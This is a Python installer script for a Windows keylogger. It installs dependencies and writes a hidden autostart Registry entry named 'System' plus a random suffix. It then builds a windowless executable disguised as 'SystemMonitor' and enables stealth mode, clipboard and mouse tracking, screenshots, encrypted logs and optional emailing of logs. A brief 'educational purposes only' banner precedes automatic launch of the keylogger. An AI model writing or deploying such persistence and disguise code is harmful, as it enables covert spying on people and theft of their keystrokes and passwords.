import os
import sys
import subprocess
import winreg
import shutil
import json
import hashlib
import base64
import time
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class KeyloggerSetup:
    def __init__(self):
        self.config_file = "config.json"
        self.default_config = {
            "screenshot_interval": 300,
            "track_mouse": True,
            "track_clipboard": True,
            "stealth_mode": True,
            "encrypt_logs": True,
            "email_enabled": False,
            "email": "",
            "password": "",
            "auto_start": True,
            "log_retention_days": 30,
            "screenshot_quality": 80,
            "hotkey_stop": "ctrl+alt+k"
        }
        self.encryption_key = None
        
    def check_python(self):
        """Check if Python is installed and has the correct version"""
        try:
            version = sys.version_info
            if version.major < 3 or (version.major == 3 and version.minor < 6):
                print("Error: Python 3.6 or higher is required")
                return False
            return True
        except:
            print("Error: Python is not installed")
            return False
            
    def install_requirements(self):
        """Install required packages"""
        try:
            print("Installing required packages...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
            return True
        except Exception as e:
            print(f"Error installing requirements: {e}")
            return False
            
    def generate_encryption_key(self):
        """Generate encryption key for log files"""
        try:
            self.encryption_key = Fernet.generate_key()
            # Save key securely
            with open("key.bin", "wb") as key_file:
                key_file.write(self.encryption_key)
            return True
        except Exception as e:
            print(f"Error generating encryption key: {e}")
            return False
            
    def setup_autostart(self):
        """Set up auto-start on boot"""
        try:
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath("gui.py")
                
            # Add to startup registry with a random name
            random_name = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, f"System{random_name}", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            return True
        except Exception as e:
            print(f"Error setting up auto-start: {e}")
            return False
            
    def create_directories(self):
        """Create necessary directories"""
        try:
            directories = ["logs", "screenshots", "temp"]
            for directory in directories:
                os.makedirs(directory, exist_ok=True)
            return True
        except Exception as e:
            print(f"Error creating directories: {e}")
            return False
            
    def setup_log_rotation(self):
        """Set up log rotation system"""
        try:
            rotation_script = """
import os
import time
from datetime import datetime, timedelta
import shutil

def rotate_logs():
    log_dir = "logs"
    retention_days = 30
    
    # Get current time
    now = datetime.now()
    
    # Check each log file
    for filename in os.listdir(log_dir):
        if filename.endswith(".txt"):
            filepath = os.path.join(log_dir, filename)
            file_time = datetime.fromtimestamp(os.path.getctime(filepath))
            
            # Delete if older than retention period
            if now - file_time > timedelta(days=retention_days):
                os.remove(filepath)
                
    # Check screenshots
    screenshot_dir = "screenshots"
    for filename in os.listdir(screenshot_dir):
        if filename.endswith(".png"):
            filepath = os.path.join(screenshot_dir, filename)
            file_time = datetime.fromtimestamp(os.path.getctime(filepath))
            
            if now - file_time > timedelta(days=retention_days):
                os.remove(filepath)

if __name__ == "__main__":
    while True:
        rotate_logs()
        time.sleep(86400)  # Check once per day
"""
            with open("log_rotation.py", "w") as f:
                f.write(rotation_script)
            return True
        except Exception as e:
            print(f"Error setting up log rotation: {e}")
            return False
            
    def create_config(self):
        """Create configuration file"""
        try:
            with open(self.config_file, "w") as f:
                json.dump(self.default_config, f, indent=4)
            return True
        except Exception as e:
            print(f"Error creating config file: {e}")
            return False
            
    def build_executable(self):
        """Build the executable using PyInstaller"""
        try:
            print("Building executable...")
            # Create a more stealthy build
            subprocess.check_call([
                sys.executable, "build.py",
                "--noconsole",
                "--icon=NONE",
                "--name=SystemMonitor"
            ])
            return True
        except Exception as e:
            print(f"Error building executable: {e}")
            return False
            
    def setup_security(self):
        """Set up security features"""
        try:
            # Generate encryption key
            if not self.generate_encryption_key():
                return False
                
            # Create security module
            security_script = """
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class Security:
    def __init__(self):
        self.key = None
        self.load_key()
        
    def load_key(self):
        try:
            with open("key.bin", "rb") as key_file:
                self.key = key_file.read()
        except:
            self.key = Fernet.generate_key()
            with open("key.bin", "wb") as key_file:
                key_file.write(self.key)
                
    def encrypt_data(self, data):
        f = Fernet(self.key)
        return f.encrypt(data.encode())
        
    def decrypt_data(self, encrypted_data):
        f = Fernet(self.key)
        return f.decrypt(encrypted_data).decode()
"""
            with open("security.py", "w") as f:
                f.write(security_script)
            return True
        except Exception as e:
            print(f"Error setting up security: {e}")
            return False
            
    def setup_keylogger(self):
        """Main setup function"""
        print("Starting keylogger setup...")
        
        # Check Python installation
        if not self.check_python():
            return False
            
        # Install requirements
        if not self.install_requirements():
            return False
            
        # Create directories
        if not self.create_directories():
            return False
            
        # Set up security
        if not self.setup_security():
            return False
            
        # Set up log rotation
        if not self.setup_log_rotation():
            return False
            
        # Create config
        if not self.create_config():
            return False
            
        # Set up auto-start
        if not self.setup_autostart():
            return False
            
        # Build executable
        if not self.build_executable():
            return False
            
        print("\nSetup completed successfully!")
        print("\nThe keylogger has been configured with the following features:")
        print("- Auto-start on boot (stealth mode)")
        print("- Window tracking")
        print("- Mouse movement tracking")
        print("- Clipboard monitoring")
        print("- Automatic screenshots")
        print("- Email logging capability")
        print("- Log encryption")
        print("- Automatic log rotation")
        print("- Configurable settings")
        print("\nThe executable has been created in the 'dist' directory.")
        print("You can also run the keylogger directly using: python gui.py")
        
        return True

if __name__ == "__main__":
    # Display ethical warning
    print("""
    ⚠️ ETHICAL WARNING ⚠️
    
    This keylogger is for educational purposes only.
    Always obtain proper consent before monitoring keyboard activity.
    Unauthorized use may be illegal and unethical.
    
    Press ENTER to continue with setup or close this window to exit.
    """)
    input()
    
    # Run setup
    setup = KeyloggerSetup()
    if setup.setup_keylogger():
        # Start the keylogger automatically
        try:
            if getattr(sys, 'frozen', False):
                subprocess.Popen([sys.executable])
            else:
                subprocess.Popen([sys.executable, "gui.py"])
        except Exception as e:
            print(f"Error starting keylogger: {e}")
    else:
        print("\nSetup failed. Please check the error messages above.") 